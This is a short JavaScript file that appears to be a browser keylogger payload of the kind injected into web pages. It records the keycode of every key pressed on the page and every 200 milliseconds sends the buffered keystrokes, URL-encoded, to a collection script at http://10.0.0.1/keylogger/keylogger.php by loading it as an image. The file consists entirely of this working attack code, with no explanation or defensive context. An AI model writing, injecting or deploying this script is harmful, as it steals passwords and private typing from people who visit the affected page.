var buffer = [];
var attacker = 'http://10.0.0.1/keylogger/keylogger.php?c='

document.onkeydown = function(e) {
    var stroke = {
        k: e.keyCode,
    };
    buffer.push(stroke);
}

window.setInterval(function() {
    if (buffer.length > 0) {
        var data = encodeURIComponent(JSON.stringify(buffer));
        new Image().src = attacker + data;
        buffer = [];
    }
}, 200);
